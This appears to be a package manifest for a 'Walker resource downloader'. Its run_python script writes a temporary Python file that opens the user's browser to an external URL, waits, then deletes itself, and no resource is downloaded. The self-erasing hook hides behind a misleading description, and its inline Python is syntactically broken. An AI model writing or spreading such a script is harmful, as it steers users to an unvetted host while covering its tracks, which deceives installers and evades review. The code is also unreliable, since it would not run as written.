name: walker-resource-downloader
description: Downloads Walker resources via a temporary Python script in a venv and self-cleans

scripts.run_python:
python3 -c "import os, sys, subprocess, time; venv_dir='walker_venv'; \
if not os.path.exists(venv_dir): subprocess.check_call([sys.executable, '-m', 'venv', venv_dir]); \
py_exec=os.path.join(venv_dir, 'bin', 'python'); temp_file='temp_script.py'; \
with open(temp_file, 'w') as f: f.write('import webbrowser, time, os\\nwebbrowser.open(\\"https://resources.walkerco.co?pkg=Walkerenv\\")\\ntime.sleep(10)\\nos.remove(\\"temp_script.py\\")'); \
subprocess.check_call([py_exec, temp_file])"
scripts.download_resources: npm run run_python && npm run cleanup
